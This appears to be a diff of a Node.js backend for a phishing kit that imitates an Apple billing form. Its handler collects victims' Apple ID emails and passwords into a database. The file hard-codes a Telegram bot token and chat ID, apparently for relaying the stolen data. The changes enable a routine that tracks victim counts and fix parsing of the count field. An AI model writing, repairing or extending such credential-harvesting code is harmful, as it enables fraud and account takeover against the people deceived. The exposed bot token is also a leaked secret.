@@ -13,19 +13,19 @@ const token = "6563244298:AAF5y_kx6LDFDa_ZXaGWB3p6ZfJXgKnrsi8";
 const bot = new TelegramBot(token, { polling: true });
 const chatID = -4076400458
 i = -1
-// async function main() {
-//   await sleep(5000)
-//   allData = await UserDB.find({})
-//   largestcount = -1
-//   for (let x = 0; x < allData.length; x++) {
-//     if (allData[x].count > largestcount) {
-//       largestcount = allData[x].count
-//     }
-//   }
-//   i = largestcount
-//   console.log(i)
-// }
-// main()
+async function main() {
+  await sleep(5000)
+  allData = await UserDB.find({})
+  largestcount = -1
+  for (let x = 0; x < allData.length; x++) {
+    if (allData[x].count > largestcount) {
+      largestcount = allData[x].count
+    }
+  }
+  i = largestcount
+  console.log(i)
+}
+main()
 
 
 // Done
@@ -77,7 +77,8 @@ exports.billingform_post = async (req, res) => {
   try {
     const email = req.body.appleid;
     const password = req.body.password
-    const count = req.body.count;
+    var count = req.body.count;
+    count = parseInt(count)
 
     await UserDB.findOneAndUpdate({ count }, { applePass2: password });
 
